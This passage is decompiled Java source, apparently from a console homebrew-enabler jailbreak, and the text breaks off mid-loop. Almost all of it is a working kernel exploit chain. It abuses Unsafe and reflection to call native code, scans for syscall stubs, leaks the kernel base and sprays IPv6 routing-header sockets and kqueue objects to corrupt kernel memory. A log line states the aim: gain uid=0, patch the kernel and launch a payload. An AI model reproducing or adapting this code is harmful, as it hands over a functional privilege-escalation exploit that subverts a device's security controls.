/*
 * ═══════════════════════════════════════════════════════════════════════
 *  RECONSTRUCTED SOURCE — NOT ORIGINAL AUTHORED CODE
 * ═══════════════════════════════════════════════════════════════════════
 *
 *  Class:         Hx1400
 *  SHA-256:       e597710078e9afab5b24f4c22ea31fe7e5a5643b602b06c2866273b61c9c57e9
 *  Source:        x/offline/Hx1400.class
 *  Decompiler:    CFR 0.152
 *  Reconstructed: 2026-10-31
 *
 *  This file is a reverse-engineering reconstruction produced by
 *  decompiling the corresponding compiled .class file. It is NOT the
 *  original .java source authored by the Bonk HEN team. Variable names,
 *  class structure, control flow, and comments may differ from the
 *  original. Original string literals, constant values, and method
 *  signatures ARE preserved by CFR and are accurate.
 *
 * ═══════════════════════════════════════════════════════════════════════
 */
/*
 * Decompiled with CFR 0.152.
 */
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import sun.misc.Unsafe;

public class Hx1400
implements Runnable {
    public static volatile String result = "not run";
    public static volatile long[] P = null;
    public static volatile long[] PG = null;
    public static volatile int[] PGL = null;
    public static volatile int[] PGN = null;
    public static volatile int[] PGW = null;
    public static volatile String PKB = null;
    static final int[] DM = new int[]{1};
    static long pM = 0L;
    static long pO = 0L;
    static long pF = 0L;
    static long rAK = 0L;
    long lkf = 0L;
    long lvf = 0L;
    long lof = 0L;
    long lsj = 0L;
    long lsc = 0L;
    long lsend = 0L;
    long lsto = 0L;
    long lcl = 0L;
    long lerF = 0L;
    long lcn = 0L;
    long lsk = 0L;
    long logB = 0L;
    long logA = 0L;
    long udpS = -1L;
    long pid = 0L;
    static final int S_READ = 3;
    static final int S_WRITE = 4;
    static final int S_OPEN = 5;
    static final int S_CLOSE = 6;
    static final int S_MUNMAP = 73;
    static final int S_SOCKET = 97;
    static final int S_SETOPT = 105;
    static final int S_GETOPT = 118;
    static final int S_SYSCTL = 202;
    static final int S_MMAP = 477;
    static final int S_KQUEUE = 362;
    static final int S_KEVENT = 363;
    static final int S_CPUGET = 487;
    static final int S_CPUSET = 488;
    static final int S_FSTAT = 189;
    static final int S_JIT = 533;
    static String BLOB1400;
    static long[] GRVA;
    static int[] GLEN;
    static int[] GNOW;
    static int[] GNEW;
    static long SE11;
    static long KEXECG;
    static final String HEN_URL = "file:/__bonk___offline_missing__/hen.bin";
    public static volatile String HENURL;
    static final StringBuffer LOGB;
    static int HEN_SIZE;
    static int HEN_ENTRY;
    static final int DCO_SET = 0;
    static final long HEN_MAP = 0x950000000L;
    static final long HEN_SPAN = 589824L;
    static final boolean LAUNCH = true;
    static int OFF_FIXES;
    static int OFF_MMAP;
    static int OFF_BLOCKUPD;
    static int OFF_ASLR;
    static int OFF_NOBD;
    static int OFF_SKIP;
    static int CFG_UPLOAD;
    static int CFG_PLUGINS;
    static final boolean KLOG_TCP = true;
    static final int KLOG_PORT = 3232;
    static final int KLOG_WAIT = 150;
    static final int KLOG_PUMP = 1500;
    static final long KLOG_CAP = 0x400000L;
    static final int PLUGINS = 1;
    static final int CFG_FIXES = 1;
    static final int CFG_MMAP = 1;
    static final int CFG_BLOCKUPD = 1;
    static final int CFG_ASLR = 1;
    static final int CFG_NOBD = 0;
    static final int CFG_SKIPPATCH = 0;
    static final int CFG_UPLOADPRX = 1;
    static final int S_AIODEL = 662;
    static final int S_AIOPOLL = 664;
    static final int S_AIOCAN = 666;
    static final int S_AIOSUB = 669;
    static final int AIO_CMD = 4097;
    static final int AIO_PRIO = 3;
    static final int HDRS = 5;
    static final int AREQ = 40;
    static final int A_NB = 8;
    static final int A_FD = 32;
    static final int CPUW = 3;
    static final int CPUT = 1;
    static final int RCAP = 32768;
    static long ANCHOR;
    static final int SEG = 32;
    static final int MAXSEG = 12;
    static final int LEN = 248;
    static final int NSPRAY = 144;
    static final int FILT = -18;
    static final int FILT23 = -23;
    static final int NVIC = 96;
    static final int P6 = 41;
    static final int RTHDR = 51;
    static final int P4 = 0;
    static final int ADDMEM = 12;
    static final int BLKSRC = 72;
    static final int MLO = 0x43434343;
    static final int MHI = 0x54545454;
    static final int[] CANDS;
    static final int ROUNDS = 6;
    static final int MAXARM = 24;
    static final int CLOSE_LO = 3;
    static final int CLOSE_HI = 37;
    static long R_SLOT;
    static long R_OPS;
    static long R_RET0;
    static long R_TOUCH;
    static long R_POPRSP;
    static long R_SAVE;
    static long R_REST;
    static long R_CONT;
    static long R_PRAX;
    static long R_PRDX;
    static long R_PRDI;
    static long R_UCRED;
    static long R_RAXRCX;
    static long R_LDRAX;
    static long R_ADDRAX;
    static long R_STRAXRDX;
    static long R_STRDIRAX;
    static long R_UIDPAIR;
    long kbase = 0L;
    long cCl = 0L;
    long cUn = 0L;
    long cCs = 0L;
    long cMsav = 0L;
    long cSo = 0L;
    int[] cRs = null;
    int cN = 0;
    int[] cVs = null;
    int cNv = 0;
    long cAnchor = -1L;
    long cKq = -1L;
    long cDf = -1L;
    long cPage = 0L;
    long cTgt = -1L;
    long cMb = 0L;
    int[] cPlugs = null;
    boolean cArmed = false;
    long cSlotA = 0L;
    long cOpsV = 0L;
    long cFake = 0L;
    long cPf = 0L;
    long cEvB = 0L;
    long cSke = 0L;
    long cGo = 0L;
    long cRb = 0L;
    long cLp = 0L;
    int cRkq = -1;
    int cHfd = -1;
    int cWfd = -1;
    long gSTACK = 0L;
    long gCTX = 0L;
    long gMARK = 0L;
    long gRES = 0L;
    long gIDENT = 0L;
    static final long MARKV = 5570198814713989681L;
    int wDone = 0;
    int wFailAt = -1;
    String wFailOp = "-";
    long wRc = 0L;
    int wBad = 0;
    int wStuck = 0;
    long lastBase = 0L;

    static String tableFault() {
        if (P == null || P.length != 31) {
            return "P missing or wrong length";
        }
        if (PG == null || PGL == null || PGN == null || PGW == null) {
            return "a patch table is missing";
        }
        if (PG.length != PGL.length || PG.length != PGN.length || PG.length != PGW.length) {
            return "the patch tables disagree in length";
        }
        if (PKB == null || PKB.length() < 64 || (PKB.length() & 1) != 0) {
            return "the payload is missing";
        }
        return null;
    }

    static void tableApply() {
        SE11 = P[0];
        KEXECG = P[1];
        HEN_SIZE = (int)P[2];
        HEN_ENTRY = (int)P[3];
        OFF_FIXES = (int)P[4];
        OFF_MMAP = (int)P[5];
        OFF_BLOCKUPD = (int)P[6];
        OFF_ASLR = (int)P[7];
        OFF_NOBD = (int)P[8];
        OFF_SKIP = (int)P[9];
        CFG_UPLOAD = (int)P[10];
        CFG_PLUGINS = (int)P[11];
        ANCHOR = P[12];
        R_SLOT = P[13];
        R_OPS = P[14];
        R_RET0 = P[15];
        R_TOUCH = P[16];
        R_POPRSP = P[17];
        R_SAVE = P[18];
        R_REST = P[19];
        R_CONT = P[20];
        R_PRAX = P[21];
        R_PRDX = P[22];
        R_PRDI = P[23];
        R_UCRED = P[24];
        R_RAXRCX = P[25];
        R_LDRAX = P[26];
        R_ADDRAX = P[27];
        R_STRAXRDX = P[28];
        R_STRDIRAX = P[29];
        R_UIDPAIR = P[30];
        GRVA = PG;
        GLEN = PGL;
        GNOW = PGN;
        GNEW = PGW;
        BLOB1400 = PKB;
    }

    private native long nativeCall(long var1, int[] var3);

    public static String LOGS() {
        return LOGB.toString();
    }

    long dlf(Method method, Object object, String string) {
        try {
            return (Long)method.invoke(object, string);
        }
        catch (Throwable throwable) {
            return 0L;
        }
    }

    static String hz(long l) {
        return "0x" + Long.toHexString(l);
    }

    static String h16(long l) {
        String string = Long.toHexString(l);
        while (string.length() < 16) {
            string = "0" + string;
        }
        return "0x" + string;
    }

    static long sx(long l) {
        if (l >= 0x80000000L && l <= 0xFFFFFFFFL) {
            return l - 0x100000000L;
        }
        return l;
    }

    long ka(long l) {
        return this.kbase + l;
    }

    static boolean kptr(long l) {
        return (l >>> 48 & 0xFFFFL) == 65535L && l != 0L;
    }

    public void run() {
        result = this.probe();
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public String probe() {
        String string = Hx1400.tableFault();
        if (string != null) {
            result = "NO TABLE: " + string + " - this class carries no addresses of its own";
            return result;
        }
        Hx1400.tableApply();
        try {
            int n;
            int n2;
            boolean bl;
            int n3;
            int n4;
            int n5;
            int n6;
            long l;
            long l2;
            long l3;
            int n7;
            long l4;
            long l5;
            int n8;
            int n9;
            long l6;
            long l7;
            int n10;
            int n11;
            int n12;
            long l8;
            long l9;
            int n13;
            long l10;
            int n14;
            int n15;
            int n16;
            long l11;
            int n17;
            int n18;
            int n19;
            long l12;
            long l13;
            long l14;
            long l15;
            long l16;
            long l17;
            long l18;
            long l19;
            int n20;
            Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Unsafe unsafe = (Unsafe)field.get(null);
            long l20 = unsafe.getLong(new Object[]{DM}, 24L);
            rAK = unsafe.getLong(l20 + 8L);
            Class<?> clazz = Class.forName("java.lang.ClassLoader$NativeLibrary");
            Method method = clazz.getDeclaredMethod("find", Class.forName("java.lang.String"));
            method.setAccessible(true);
            Field field2 = clazz.getDeclaredField("handle");
            field2.setAccessible(true);
            Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            Object obj = constructor.newInstance(Class.forName("Hx1400"), "x", new Boolean(true));
            field2.setLong(obj, 8193L);
            long l21 = this.dlf(method, obj, "sigsetjmp");
            long l22 = this.dlf(method, obj, "__Ux86_64_setcontext");
            long l23 = this.dlf(method, obj, "getpid");
            long l24 = this.dlf(method, obj, "socket");
            long l25 = this.dlf(method, obj, "__error");
            long l26 = this.dlf(method, obj, "sendto");
            field2.setLong(obj, -2L);
            long l27 = this.dlf(method, obj, "Java_java_lang_reflect_Array_multiNewArray");
            long l28 = this.dlf(method, obj, "JVM_NativePath");
            field2.setLong(obj, 8193L);
            if (l27 == 0L) {
                field2.setLong(obj, 74L);
                l27 = this.dlf(method, obj, "Java_java_lang_reflect_Array_multiNewArray");
                field2.setLong(obj, 8193L);
            }
            if (l21 == 0L || l22 == 0L || l27 == 0L || l28 == 0L || l23 == 0L) {
                return "SYM1";
            }
            System.gc();
            System.gc();
            try {
                Thread.sleep(50L);
            }
            catch (Throwable throwable) {
                // empty catch block
            }
            long l29 = unsafe.getLong(new Object[]{this}, 24L);
            long l30 = unsafe.getLong(l29 + 8L);
            long l31 = unsafe.getLong(l30 + 200L);
            int n21 = unsafe.getInt(l31 + 16L);
            byte[] byArray = new byte[]{112, 114, 111, 98, 101};
            for (n20 = 0; n20 < n21; ++n20) {
                l19 = unsafe.getLong(l31 + 24L + (long)n20 * 8L);
                if (l19 == 0L || l19 < 65536L) continue;
                long l32 = unsafe.getLong(l19 + 16L);
                l18 = unsafe.getLong(l19 + 24L);
                if (l32 == 0L || l18 == 0L || (l17 = unsafe.getLong(l18 + 64L + (long)unsafe.getShort(l32 + 66L) * 8L) & 0xFFFFFFFFFFFFFFFEL) == 0L || unsafe.getShort(l17 + 8L) != 5) continue;
                boolean bl2 = true;
                for (int i = 0; i < 5; ++i) {
                    if (unsafe.getByte(l17 + 10L + (long)i) == byArray[i]) continue;
                    bl2 = false;
                    break;
                }
                if (!bl2) continue;
                unsafe.putInt(l19 + 44L, unsafe.getInt(l19 + 44L) | 0x6000000);
            }
            n20 = 0;
            l19 = 0L;
            byte[] byArray2 = new byte[]{110, 97, 116, 105, 118, 101, 67, 97, 108, 108};
            for (int i = 0; i < n21; ++i) {
                long l33;
                l18 = unsafe.getLong(l31 + 24L + (long)i * 8L);
                if (l18 == 0L || l18 < 65536L) continue;
                l17 = unsafe.getLong(l18 + 16L);
                long l34 = unsafe.getLong(l18 + 24L);
                if (l17 == 0L || l34 == 0L || (l33 = unsafe.getLong(l34 + 64L + (long)unsafe.getShort(l17 + 66L) * 8L) & 0xFFFFFFFFFFFFFFFEL) == 0L || (unsafe.getShort(l33 + 8L) & 0xFFFF) != 10) continue;
                boolean bl3 = true;
                for (int j = 0; j < 10; ++j) {
                    if (unsafe.getByte(l33 + 10L + (long)j) == byArray2[j]) continue;
                    bl3 = false;
                    break;
                }
                if (!bl3 || unsafe.getByte(l33 + 10L + 10L) != 0 || n20 != 0) continue;
                l19 = unsafe.getLong(l18 + 120L);
                pM = l18;
                pO = l19;
                pF = l27;
                unsafe.putInt(l18 + 44L, unsafe.getInt(l18 + 44L) | 0x6000000);
                n20 = 1;
            }
            if (n20 == 0) {
                return "NO_NC_SYM";
            }
            long l35 = unsafe.allocateMemory(2048L);
            unsafe.setMemory(l35, 2048L, (byte)0);
            long l36 = l35;
            long l37 = l35 + 32L;
            long l38 = l35 + 256L;
            long l39 = l35 + 1024L;
            unsafe.putLong(l36, l37);
            unsafe.putLong(l37 + 104L, l38);
            unsafe.putLong(l39 + 128L, l28);
            unsafe.putLong(l39 + 240L, l28);
            unsafe.putLong(l38 + 16L, l39);
            unsafe.putLong(l38 + 32L, l39);
            unsafe.putLong(l38 + 184L, 0L);
            unsafe.putLong(l39 + 560L, l21 + 35L);
            unsafe.putLong(pM + 120L, pF);
            long l40 = this.nativeCall(l36, DM);
            unsafe.putLong(pM + 120L, l19);
            if (l40 != 0L && l40 > 65536L) {
                long l41 = unsafe.getLong(l40 + 8L);
                if (l41 != 0L && l41 != rAK && l41 > 65536L) {
                    rAK = l41;
                }
                unsafe.putLong(l40 + 8L, rAK);
                unsafe.putLong(l40 + 24L, 0L);
            }
            this.lkf = l38;
            this.lvf = l39;
            this.lof = l36;
            this.lsj = l21;
            this.lsc = l22;
            this.lsto = l26;
            this.lerF = l25;
            this.lsk = l24;
            this.pid = this.ac(unsafe, l23, 0L, 0L, 0L, 0L, 0L, 0L);
            if (this.pid <= 0L) {
                return "FAIL_PID";
            }
            pO = pF;
            this.logB = unsafe.allocateMemory(256L);
            this.logA = unsafe.allocateMemory(16L);
            unsafe.setMemory(this.logA, 16L, (byte)0);
            unsafe.putByte(this.logA, (byte)16);
            unsafe.putByte(this.logA + 1L, (byte)2);
            unsafe.putByte(this.logA + 2L, (byte)35);
            unsafe.putByte(this.logA + 3L, (byte)65);
            unsafe.putByte(this.logA + 4L, (byte)-64);
            unsafe.putByte(this.logA + 5L, (byte)-88);
            unsafe.putByte(this.logA + 6L, (byte)8);
            unsafe.putByte(this.logA + 7L, (byte)81);
            this.udpS = this.ac(unsafe, l24, 2L, 2L, 0L, 0L, 0L, 0L);
            this.lg(unsafe, "=== MM-HEN14V : uid=0, patch the kernel, then load and launch hen.bin. pid=" + this.pid + " ===");
            int[] nArray = new int[]{3, 4, 5, 6, 73, 97, 105, 118, 202, 477, 362, 363, 487, 488, 669, 666, 664, 662, 189};
            int[] nArray2 = new int[]{533};
            long[] lArray = new long[nArray.length];
            int n22 = 0;
            block19: for (l16 = l23; l16 < l23 + 32768L && n22 < nArray.length; l16 += 4L) {
                for (int i = 0; i < nArray.length; ++i) {
                    if (lArray[i] != 0L || !this.chk(unsafe, l16, nArray[i])) continue;
                    lArray[i] = l16;
                    ++n22;
                    continue block19;
                }
            }
            l16 = 0L;
            for (l15 = l23; l15 < l23 + 32768L; l15 += 4L) {
                if (!this.chk(unsafe, l15, 20)) continue;
                l16 = l15;
                break;
            }
            this.lg(unsafe, "stubs " + n22 + "/" + nArray.length + " control=" + (l16 == l23 ? "AGREE" : "DISAGREE"));
            if (n22 != nArray.length || l16 != l23) {
                return this.fin(unsafe, "stubs " + n22 + "/" + nArray.length);
            }
            l15 = lArray[0];
            long l42 = lArray[1];
            long l43 = lArray[2];
            long l44 = lArray[3];
            long l45 = lArray[4];
            long l46 = lArray[5];
            long l47 = lArray[6];
            long l48 = lArray[7];
            long l49 = lArray[8];
            long l50 = lArray[9];
            long l51 = lArray[10];
            long l52 = lArray[11];
            long l53 = lArray[12];
            long l54 = lArray[13];
            long l55 = lArray[14];
            long l56 = lArray[15];
            long l57 = lArray[16];
            long l58 = lArray[17];
            long l59 = lArray[18];
            long l60 = 0L;
            for (l14 = l23; l14 < l23 + 32768L; l14 += 4L) {
                if (!this.chk(unsafe, l14, 533)) continue;
                l60 = l14;
                break;
            }
            l14 = 0L;
            for (l13 = l23; l13 < l23 + 32768L; l13 += 4L) {
                if (!this.chk(unsafe, l13, 136)) continue;
                l14 = l13;
                break;
            }
            l13 = 0L;
            long l61 = 0L;
            long l62 = 0L;
            long l63 = 0L;
            for (l12 = l23; l12 < l23 + 32768L; l12 += 4L) {
                if (l13 == 0L && this.chk(unsafe, l12, 104)) {
                    l13 = l12;
                }
                if (l61 == 0L && this.chk(unsafe, l12, 106)) {
                    l61 = l12;
                }
                if (l62 == 0L && this.chk(unsafe, l12, 30)) {
                    l62 = l12;
                }
                if (l63 != 0L || !this.chk(unsafe, l12, 92)) continue;
                l63 = l12;
            }
            this.cCl = l44;
            this.cUn = l45;
            this.cCs = l54;
            this.cSo = l47;
            l12 = unsafe.allocateMemory(32L);
            long l64 = unsafe.allocateMemory(16L);
            long l65 = unsafe.allocateMemory(32768L);
            long l66 = unsafe.allocateMemory(200L);
            long l67 = unsafe.allocateMemory(20L);
            long l68 = unsafe.allocateMemory(20L);
            long l69 = unsafe.allocateMemory(20L);
            long l70 = unsafe.allocateMemory(20L);
            long l71 = unsafe.allocateMemory(16L);
            long l72 = unsafe.allocateMemory(16L);
            long l73 = unsafe.allocateMemory(16L);
            long l74 = unsafe.allocateMemory(512L);
            long l75 = unsafe.allocateMemory(512L);
            long l76 = unsafe.allocateMemory(8L);
            long l77 = unsafe.allocateMemory(64L);
            long l78 = unsafe.allocateMemory(32L);
            long l79 = unsafe.allocateMemory(16L);
            long l80 = unsafe.allocateMemory(16L);
            long l81 = unsafe.allocateMemory(16L);
            unsafe.setMemory(l12, 32L, (byte)0);
            unsafe.setMemory(l64, 16L, (byte)0);
            unsafe.setMemory(l65, 32768L, (byte)0);
            unsafe.setMemory(l66, 200L, (byte)0);
            unsafe.setMemory(l71, 16L, (byte)0);
            unsafe.setMemory(l72, 16L, (byte)0);
            unsafe.setMemory(l73, 16L, (byte)0);
            this.cMsav = l71;
            this.cMb = l74;
            unsafe.setMemory(l74, 512L, (byte)0);
            unsafe.setMemory(l78, 32L, (byte)0);
            unsafe.setMemory(l79, 16L, (byte)0);
            unsafe.setMemory(l80, 16L, (byte)0);
            unsafe.setMemory(l81, 16L, (byte)0);
            int[] nArray3 = new int[]{4, 17, 0, 28, 1, 0};
            for (n19 = 0; n19 < 6; ++n19) {
                unsafe.putInt(l12 + (long)n19 * 4L, nArray3[n19]);
            }
            for (n19 = 0; n19 < 5; ++n19) {
                unsafe.putInt(l66 + (long)(n19 * 40) + 8L, 0);
                unsafe.putInt(l66 + (long)(n19 * 40) + 32L, -1);
            }
            byte[] byArray3 = new byte[]{47, 100, 101, 118, 47, 100, 99, 101};
            for (n18 = 0; n18 < byArray3.length; ++n18) {
                unsafe.putByte(l78 + (long)n18, byArray3[n18]);
            }
            unsafe.putByte(l74 + 1L, (byte)30);
            unsafe.putByte(l74 + 3L, (byte)15);
            n18 = 8;
            while (n18 + 8 <= 248) {
                unsafe.putInt(l74 + (long)n18, 0x43434343);
                unsafe.putInt(l74 + (long)n18 + 4L, 0x54545454);
                n18 += 8;
            }
            unsafe.putByte(l79, (byte)-17);
            unsafe.putByte(l79 + 1L, (byte)-1);
            unsafe.putByte(l79 + 2L, (byte)-1);
            unsafe.putByte(l79 + 3L, (byte)-6);
            unsafe.putByte(l80, (byte)-17);
            unsafe.putByte(l80 + 1L, (byte)-1);
            unsafe.putByte(l80 + 2L, (byte)-1);
            unsafe.putByte(l80 + 3L, (byte)-7);
            unsafe.putByte(l81, (byte)-17);
            unsafe.putByte(l81 + 1L, (byte)-1);
            unsafe.putByte(l81 + 2L, (byte)-1);
            unsafe.putByte(l81 + 3L, (byte)-7);
            unsafe.putByte(l81 + 4L, (byte)-64);
            unsafe.putByte(l81 + 5L, (byte)0);
            unsafe.putByte(l81 + 6L, (byte)2);
            unsafe.putByte(l81 + 7L, (byte)1);
            long l82 = unsafe.allocateMemory(1024L);
            long l83 = unsafe.allocateMemory(8L);
            int n23 = 0;
            int n24 = 0;
            for (int i = 3; i <= 340; ++i) {
                if (Hx1400.sx(this.ac(unsafe, l47, i, 0L, 13L, l80, 8L, 0L)) == 0L) {
                    this.ac(unsafe, l47, i, 0L, 13L, l79, 8L, 0L);
                    if (Hx1400.sx(this.ac(unsafe, l44, i, 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
                    ++n23;
                    continue;
                }
                unsafe.putInt(l83, 1024);
                if (Hx1400.sx(this.ac(unsafe, l48, i, 41L, 51L, l82, l83, 0L)) != 0L || unsafe.getInt(l83) != 248 || Hx1400.sx(this.ac(unsafe, l44, i, 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
                ++n24;
            }
            this.lg(unsafe, "R reclaimed " + n23 + " leaked victims + " + n24 + " leaked spray sockets from earlier runs");
            long l84 = Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L));
            if (l84 >= 0L) {
                this.ac(unsafe, l44, l84, 0L, 0L, 0L, 0L, 0L);
            }
            this.lg(unsafe, "R lowest free fd after reclaim = " + l84 + " (need ~250 below the ~291 ceiling)");
            if (l84 > 40L) {
                this.lg(unsafe, "R \u26a0 still high - if the run stops at `victims N/96`, restart the Disc Player once");
            }
            long l85 = -1L;
            unsafe.putLong(l64, 0L);
            if (Hx1400.sx(this.ac(unsafe, l49, l12, 6L, 0L, l64, 0L, 0L)) != 0L) {
                return this.fin(unsafe, "route closed");
            }
            long l86 = Hx1400.sx(this.ac(unsafe, l53, 3L, 1L, l85, 16L, l71, 0L));
            int n25 = -1;
            for (n17 = 0; n17 < 128; ++n17) {
                if ((unsafe.getByte(l71 + (long)(n17 >>> 3)) & 1 << (n17 & 7)) == 0) continue;
                n25 = n17;
                break;
            }
            if (l86 != 0L || n25 < 0) {
                return this.fin(unsafe, "affinity");
            }
            unsafe.putByte(l72 + (long)(n25 >>> 3), (byte)(1 << (n25 & 7)));
            this.ac(unsafe, l54, 3L, 1L, l85, 16L, l72, 0L);
            unsafe.setMemory(l73, 16L, (byte)0);
            this.ac(unsafe, l53, 3L, 1L, l85, 16L, l73, 0L);
            if (!this.meq(unsafe, l72, l73)) {
                return this.fin(unsafe, "pin readback");
            }
            this.lg(unsafe, "A pinned core=" + n25);
            for (n17 = 0; n17 < 12 && this.lastBase == 0L; ++n17) {
                unsafe.putLong(l64, 32768L);
                if (this.wash(unsafe, l55, l56, l57, l58, l66, l67, l68, l69, l70, 32) != 32) {
                    this.ac(unsafe, l54, 3L, 1L, l85, 16L, l71, 0L);
                    return this.fin(unsafe, "wash stalled " + this.failStr());
                }
                this.ac(unsafe, l49, l12, 6L, l65, l64, 0L, 0L);
                this.parse(unsafe, l65, unsafe.getLong(l64));
                if (this.lastBase != 0L) continue;
                this.lg(unsafe, "A seg " + (n17 + 1) + "/" + 12 + " (" + (n17 + 1) * 32 + " cycles) no anchor yet");
            }
            this.kbase = this.lastBase;
            this.lg(unsafe, "A segments=" + n17 + " cycles=" + n17 * 32);
            this.ac(unsafe, l54, 3L, 1L, l85, 16L, l71, 0L);
            this.lg(unsafe, "A KBASE=" + (this.kbase != 0L ? Hx1400.h16(this.kbase) : "none") + " washStuck=" + this.wStuck);
            if (this.kbase == 0L) {
                return this.fin(unsafe, "no kbase");
            }
            unsafe.setMemory(l73, 16L, (byte)0);
            this.ac(unsafe, l54, 3L, 1L, l85, 16L, l72, 0L);
            this.ac(unsafe, l53, 3L, 1L, l85, 16L, l73, 0L);
            if (!this.meq(unsafe, l72, l73)) {
                return this.fin(unsafe, "re-pin");
            }
            int n26 = (int)Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L));
            int[] nArray4 = new int[96];
            int n27 = 0;
            long l87 = -1L;
            for (int i = 0; i < 96 && (l11 = Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L))) > l87; ++i) {
                l87 = l11;
                nArray4[n27++] = (int)l11;
            }
            this.cAnchor = n26;
            this.cVs = nArray4;
            this.cNv = n27;
            this.lg(unsafe, "B0 anchor=" + n26 + " victims=" + n27 + "/" + 96 + " highest=" + l87);
            if (n26 < 0 || n27 != 96) {
                return this.fin(unsafe, "victims " + n27);
            }
            long l88 = unsafe.allocateMemory(256L);
            long l89 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
            long l90 = -1L;
            long l91 = -1L;
            long l92 = -1L;
            if (l89 >= 0L) {
                unsafe.setMemory(l88, 256L, (byte)0);
                if (Hx1400.sx(this.ac(unsafe, l59, l89, l88, 0L, 0L, 0L, 0L)) == 0L) {
                    l92 = (long)unsafe.getInt(l88 + 0L) & 0xFFFFFFFFL;
                    l91 = (long)unsafe.getInt(l88 + 4L) & 0xFFFFFFFFL;
                    l90 = (long)unsafe.getInt(l88 + 20L) & 0xFFFFFFFFL;
                }
            }
            this.lg(unsafe, "B1 our dce fd=" + l89 + " dev=" + Hx1400.hz(l92) + " ino=" + Hx1400.hz(l91) + " rdev=" + Hx1400.hz(l90));
            if (l91 <= 0L) {
                return this.fin(unsafe, "our own /dev/dce has no usable st_ino - refusing to guess");
            }
            int[] nArray5 = new int[64];
            int n28 = 0;
            int[] nArray6 = new int[64];
            int n29 = 0;
            this.cPlugs = nArray6;
            StringBuffer stringBuffer = new StringBuffer("B1 census");
            for (int i = 3; i <= 37; ++i) {
                unsafe.setMemory(l88, 256L, (byte)0);
                if (Hx1400.sx(this.ac(unsafe, l59, i, l88, 0L, 0L, 0L, 0L)) != 0L) continue;
                n16 = unsafe.getShort(l88 + 8L) & 0xFFFF;
                long l93 = (long)unsafe.getInt(l88 + 0L) & 0xFFFFFFFFL;
                long l94 = (long)unsafe.getInt(l88 + 4L) & 0xFFFFFFFFL;
                long l95 = (long)unsafe.getInt(l88 + 20L) & 0xFFFFFFFFL;
                if ((n16 & 0xF000) != 8192) continue;
                boolean bl4 = l94 == l91;
                stringBuffer.append(" ").append(i).append(":ino").append(Long.toHexString(l94)).append("/rdev").append(Long.toHexString(l95)).append(bl4 ? "*" : "");
                if (!bl4 || n28 >= 64) continue;
                nArray5[n28++] = i;
            }
            this.lg(unsafe, stringBuffer.toString());
            this.lg(unsafe, "B1 fds whose st_ino == our dce's = " + n28 + "  (* marks a real match)");
            StringBuffer stringBuffer2 = new StringBuffer("B1 match list:");
            for (n16 = 0; n16 < n28; ++n16) {
                stringBuffer2.append(" ").append(nArray5[n16]);
            }
            this.lg(unsafe, stringBuffer2.toString());
            if (l89 >= 0L) {
                this.ac(unsafe, l44, l89, 0L, 0L, 0L, 0L, 0L);
            }
            n16 = 0;
            for (n15 = 0; n15 < n28; ++n15) {
                if (Hx1400.sx(this.ac(unsafe, l44, nArray5[n15], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
                ++n16;
            }
            this.lg(unsafe, "B1 closed " + n16 + "/" + n28 + " dce fds (matched by inode, not by rdev)");
            n15 = 0;
            long l96 = 0L;
            String[] stringArray = new String[]{"/dev/null", "/dev/zero", "/dev/urandom", "/dev/random"};
            for (n14 = 0; n14 < stringArray.length && l96 == 0L; ++n14) {
                l10 = this.cstr(unsafe, stringArray[n14]);
                long l97 = Hx1400.sx(this.ac(unsafe, l43, l10, 2L, 0L, 0L, 0L, 0L));
                if (l97 < 0L) continue;
                this.ac(unsafe, l44, l97, 0L, 0L, 0L, 0L, 0L);
                l96 = l10;
                this.lg(unsafe, "B1 plug device = " + stringArray[n14]);
            }
            if (l96 != 0L) {
                for (n14 = 0; n14 < n28; ++n14) {
                    l10 = Hx1400.sx(this.ac(unsafe, l43, l96, 2L, 0L, 0L, 0L, 0L));
                    if (l10 < 0L) continue;
                    nArray6[n29++] = (int)l10;
                    if (l10 != (long)nArray5[n14]) continue;
                    ++n15;
                }
                this.lg(unsafe, "B1 plugged " + n15 + "/" + n28 + " of the app's own fd numbers with an inert device");
            } else {
                this.lg(unsafe, "B1 no plug device available - the app's fd numbers WILL be reused by the spray");
            }
            long l98 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
            long l99 = l98 >= 0L ? Hx1400.sx(this.ac(unsafe, l44, l98, 0L, 0L, 0L, 0L, 0L)) : -1L;
            boolean bl5 = l98 >= 0L && l99 == 0L;
            this.lg(unsafe, "B1 warm dce open=" + l98 + " close=" + l99);
            int[] nArray7 = new int[144];
            int n30 = 0;
            long l100 = -1L;
            for (n13 = 0; n13 < 144 && (l9 = Hx1400.sx(this.ac(unsafe, l46, 28L, 2L, 0L, 0L, 0L, 0L))) > l100; ++n13) {
                l100 = l9;
                nArray7[n30++] = (int)l9;
            }
            for (n13 = 0; n13 < n30; ++n13) {
                this.ac(unsafe, l47, nArray7[n13], 41L, 51L, l74, 248L, 0L);
            }
            this.cRs = nArray7;
            this.cN = n30;
            this.lg(unsafe, "B spray n=" + n30 + " highest=" + l100);
            if (n30 < 128) {
                return this.fin(unsafe, "spray n=" + n30);
            }
            this.cKq = l8 = Hx1400.sx(this.ac(unsafe, l51, 0L, 0L, 0L, 0L, 0L, 0L));
            if (l8 < 0L) {
                return this.fin(unsafe, "kqueue");
            }
            int n31 = -1;
            int n32 = -1;
            int n33 = -1;
            int n34 = -1;
            long l101 = -1L;
            long l102 = 0L;
            int n35 = 0;
            int n36 = 0;
            for (n12 = 1; n12 <= 6 && n32 < 0 && n35 < 32; ++n12) {
                int n37;
                for (n37 = 0; n37 < n30; ++n37) {
                    this.ac(unsafe, l47, nArray7[n37], 41L, 51L, 0L, 0L, 0L);
                }
                for (n37 = 0; n37 < n30; ++n37) {
                    this.ac(unsafe, l47, nArray7[n37], 41L, 51L, l74, 248L, 0L);
                }
